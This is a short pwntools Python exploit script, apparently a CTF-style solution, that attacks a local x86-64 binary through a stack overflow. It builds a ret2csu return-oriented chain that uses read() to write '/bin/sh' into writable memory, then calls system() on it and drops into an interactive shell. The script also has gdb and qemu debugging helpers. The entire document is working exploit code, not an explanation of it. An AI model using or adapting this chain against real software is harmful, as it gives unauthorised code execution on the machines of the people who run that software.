from pwn import *

binary = args.BIN

context.terminal = ["tmux", "splitw", "-h"]
e = context.binary = ELF(binary)
r = ROP(e)

gs = ''' 
break *0x40071a
break *0x400700
continue '''


def start():
    if (args.QEMU and args.GDB):
        p=process(['qemu-amd64', '-g', '1234', e.path])
        gdb.attach(target=('localhost',1234), exe=e.path, gdbscript=gs)
        return p
    elif (args.QEMU):
        return process(['qemu-amd64', e.path])
    elif args.GDB:
        return gdb.debug(e.path, gdbscript=gs)
    else:
        return process(e.path)


pop_rdi = (r.find_gadget(['pop rdi', 'ret']))[0]
ret = pop_rdi + 1
system = e.sym['system']
read = e.sym['read']
writable_mem = 0x601068
p = start()

r.raw(cyclic(16))
r.ret2csu(edi=0, rsi=writable_mem, rdx=8, call=e.got['read'])

r.call(pop_rdi)
r.raw(p64(writable_mem))
r.call(system)

log.info("ret2csu chain:\n %s" % r.dump())
p.sendline(bytes(r))


log.info("Pausing To Send /bin/sh")
pause()
p.sendline(b'/bin/sh\0')

p.interactive()
